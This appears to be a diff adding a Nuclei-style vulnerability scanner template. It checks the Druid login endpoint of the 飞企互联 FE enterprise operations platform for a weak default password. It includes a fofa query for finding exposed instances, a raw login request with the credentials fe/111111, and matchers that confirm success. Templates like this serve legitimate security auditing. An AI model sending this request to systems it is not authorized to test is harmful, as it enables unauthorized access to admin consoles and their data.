@@ -1,0 +1,40 @@
+id: feiqi-FE-druid-Weak-password
+
+info:
+  name: "飞企互联-FE企业运营管理平台druid接口弱口令漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="飞企互联-FE企业运营管理平台"
+      /druid/login.html 接口在飞企互联-FE企业运营管理平台中存在弱口令认证缺陷。攻击者可利用该漏洞访问后台管理界面，进而获取敏感数据并实现对服务器的控制。系统未实施有效的身份验证机制，导致默认凭证可被直接用于未授权访问。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488641&idx=1&sn=eb30b6cb0986ab9987b7742a6d894dd9&chksm=c267a1b2f51028a4e29bed796793ec0a897f5fbe14679c2f97dfc7c1f6964572cfe688a8500b&token=582574297&lang=zh_CN#rd
+  tags: 飞企互联
+
+http:
+- raw:
+  - |
+    POST /druid/submitLogin HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    loginUsername=fe&loginPassword=111111
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: header
+    words:
+    - "Set-Cookie: JSESSIONID="
+  - type: word
+    part: body
+    words:
+    - 'success'
+  - type: status
+    status:
+    - 200
+  - type: word
+    negative: true      # 关键负向标记
+    part: body
+    words:
+    - 'false'
